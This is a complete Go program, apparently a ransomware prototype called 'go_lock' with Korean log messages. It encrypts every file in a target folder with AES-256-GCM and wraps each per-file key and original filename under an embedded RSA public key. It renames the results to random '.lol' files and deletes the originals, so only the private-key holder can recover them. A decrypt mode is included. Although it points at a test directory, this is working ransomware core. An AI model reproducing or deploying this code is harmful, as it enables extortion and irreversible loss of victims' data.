package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
)

const (
	targetDir    = "Test_Encryption"
	keyDir       = "Key"
	encExtension = ".lol"
)

const publicKeyPEM = `-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEArdbpLscDSPLXf2Jg+oU6UTQUYVb9jtZUH+tHGlUraFCs086cxDEl
xZN4iMw+iNTioxcQj1dRBtRuYl6LOqwtanqssEexgEADx6ah5vRIbFbzrFwUctHv
Ai70/tcCATAJv8qNUu4Dee91UYC/k3MY4PrI0J8qqHVdZbqYGPoLvGwl/E95ChOo
4j4zUrcUZqYBbkkU5TDhgNEhUfZT1F0mmflvx3xt0AtBxymd1XNBt9WYAO3PyiDR
1odwlHj/vpLnLgnOh8HmpR2eENX7Az6DWnfGDgGpMVu5M9pDdnImNoUhF4+8F8RK
qQ4uPFyu95rCCYCw4XK7dXWpbTBkn4N5DQIDAQAB
-----END RSA PUBLIC KEY-----`

type KeyData struct {
	OriginalFilename string `json:"filename"`
	AESKey           []byte `json:"key"`
}

func loadPrivateKey(fileName string) *rsa.PrivateKey {
	keyData, err := os.ReadFile(fileName)
	if err != nil {
		log.Fatalf("개인키 파일 읽기 실패 (%s): %v", fileName, err)
	}
	block, _ := pem.Decode(keyData)
	if block == nil {
		log.Fatalf("개인키 파일 파싱 실패: 유효한 PEM 형식이 아닙니다.")
	}
	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		log.Fatalf("개인키 파싱 실패: %v", err)
	}
	return privateKey
}

func loadPublicKeyFromString() *rsa.PublicKey {
	block, _ := pem.Decode([]byte(publicKeyPEM))
	if block == nil {
		log.Fatalf("내장된 공개키 파싱 실패: 유효한 PEM 형식이 아닙니다.")
	}
	publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		log.Fatalf("내장된 공개키 파싱 실패: %v", err)
	}
	return publicKey
}

func encryptAES(data []byte) (encryptedData []byte, aesKey []byte, err error) {
	aesKey = make([]byte, 32) // AES-256
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		return nil, nil, err
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, nil, err
	}
	encryptedData = gcm.Seal(nonce, nonce, data, nil)
	return encryptedData, aesKey, nil
}

func decryptAES(encryptedData []byte, aesKey []byte) ([]byte, error) {
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(encryptedData) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := encryptedData[:nonceSize], encryptedData[nonceSize:]
	decryptedData, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return decryptedData, nil
}

func encryptProcess() {
	fmt.Println("\n--- Starting Encryption Process (Metadata Encrypted) ---")
	if err := os.MkdirAll(keyDir, 0755); err != nil {
		log.Fatalf("키 디렉토리 생성 실패: %v", err)
	}

	publicKey := loadPublicKeyFromString()

	err := filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return err
		}

		originalFilename := info.Name()
		fmt.Printf("Encrypting: %s\n", path)
		fileData, _ := os.ReadFile(path)

		encryptedData, plainAESKey, _ := encryptAES(fileData)

		keyData := KeyData{
			OriginalFilename: originalFilename,
			AESKey:           plainAESKey,
		}
		keyJson, _ := json.Marshal(keyData)

		encryptedKeyData, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, keyJson, nil)
		if err != nil {
			log.Printf("FAIL: 메타데이터 암호화 실패 %s: %v", originalFilename, err)
			return nil
		}

		randomBytes := make([]byte, 8)
		rand.Read(randomBytes)
		newEncFilename := hex.EncodeToString(randomBytes) + encExtension
		encFilePath := filepath.Join(targetDir, newEncFilename)
		os.WriteFile(encFilePath, encryptedData, 0644)

		keyFilePath := filepath.Join(keyDir, strings.TrimSuffix(newEncFilename, encExtension)+".key")
		os.WriteFile(keyFilePath, encryptedKeyData, 0644)

		os.Remove(path)
		return nil
	})
	if err != nil {
		log.Fatalf("암호화 중 에러 발생: %v", err)
	}
	fmt.Println("--- Encryption Complete ---")
}

func decryptProcess(privateKeyPath string) {
	fmt.Printf("\n--- Starting Decryption Process using key: %s ---\n", privateKeyPath)
	privateKey := loadPrivateKey(privateKeyPath)

	err := filepath.Walk(keyDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || !strings.HasSuffix(info.Name(), ".key") {
			return err
		}

		fmt.Printf("Processing key: %s\n", path)

		encryptedKeyData, err := os.ReadFile(path)
		if err != nil {
			log.Printf("SKIP: 키 파일 읽기 실패 %s: %v", path, err)
			return nil
		}
		decryptedKeyJson, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, encryptedKeyData, nil)
		if err != nil {
			log.Printf("FAIL: 메타데이터 복호화 실패 %s: %v", path, err)
			return nil
		}

		var keyData KeyData
		if err := json.Unmarshal(decryptedKeyJson, &keyData); err != nil {
			log.Printf("SKIP: 키 데이터 파싱 실패 %s: %v", path, err)
			return nil
		}

		encFilename := strings.TrimSuffix(info.Name(), ".key") + encExtension
		encFilePath := filepath.Join(targetDir, encFilename)
		encryptedData, _ := os.ReadFile(encFilePath)

		decryptedData, err := decryptAES(encryptedData, keyData.AESKey)
		if err != nil {
			log.Printf("FAIL: 파일 복호화 실패 %s: %v", path, err)
			return nil
		}

		decryptedPath := filepath.Join(targetDir, keyData.OriginalFilename)
		os.WriteFile(decryptedPath, decryptedData, 0644)
		fmt.Printf(" -> Restored to: %s\n", decryptedPath)

		os.Remove(encFilePath)
		os.Remove(path)
		return nil
	})
	if err != nil {
		log.Fatalf("복호화 중 에러 발생: %v", err)
	}
	fmt.Println("--- Decryption Complete ---")
}

func main() {
	encryptMode := flag.Bool("e", false, "암호화 모드를 활성화합니다.")
	decryptKeyPath := flag.String("d", "", "복호화 모드를 활성화하고, 사용할 개인키 파일의 경로를 지정합니다.")
	flag.Parse()

	if *encryptMode && *decryptKeyPath != "" {
		fmt.Println("오류: -e 와 -d 플래그는 함께 사용할 수 없습니다.")
	} else if *encryptMode {
		encryptProcess()
	} else if *decryptKeyPath != "" {
		decryptProcess(*decryptKeyPath)
	} else {
		fmt.Println("사용법: go_lock [-e | -d <private_key_path>] \n -e: 암호화를 실행합니다.\n -d <private_key_path>: 지정된 개인키로 복호화를 실행합니다.")
	}
}
